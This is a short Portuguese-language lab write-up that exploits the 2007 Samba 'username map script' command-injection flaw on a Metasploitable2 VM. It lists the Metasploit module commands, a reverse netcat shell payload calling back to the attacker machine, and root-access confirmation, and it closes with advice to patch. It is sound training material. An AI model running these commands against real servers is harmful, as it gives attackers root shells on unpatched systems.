# Writeup: Samba "username map script" Command Execution - Metasploitable2

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: Metasploitable2 (VM VirtualBox)
- Rede: Internal Network isolada (192.168.56.0/24)

## 1. Reconhecimento
Identificado na varredura inicial com Nmap: Samba smbd rodando
nas portas 139/tcp e 445/tcp.

## 2. Identificação da vulnerabilidade
Versões antigas do Samba permitem que a opção de configuração
"username map script" seja usada para injetar comandos shell
através de metacaracteres no campo de nome de usuário durante a
negociação do protocolo, um dos exploits mais antigos usados
neste laboratório (divulgado em 2007).

## 3. Exploração
Uso do módulo do Metasploit Framework:

    use exploit/multi/samba/usermap_script
    set RHOSTS 192.168.56.10
    set LHOST 192.168.56.11
    exploit

Diferente dos exploits anteriores (que abriam sessão Meterpreter),
este utiliza o payload cmd/unix/reverse_netcat, entregando
diretamente um shell de comando reverso via netcat.

## 4. Confirmação de acesso
    whoami          -> root
    id              -> uid=0(root) gid=0(root)

## Conclusão
Acesso root obtido através de injeção de comando na configuração
do Samba. É a vulnerabilidade mais antiga explorada até agora
neste laboratório (2007), reforçando a importância de manter
serviços de compartilhamento de arquivo sempre atualizados e
nunca expor Samba diretamente à internet sem necessidade.
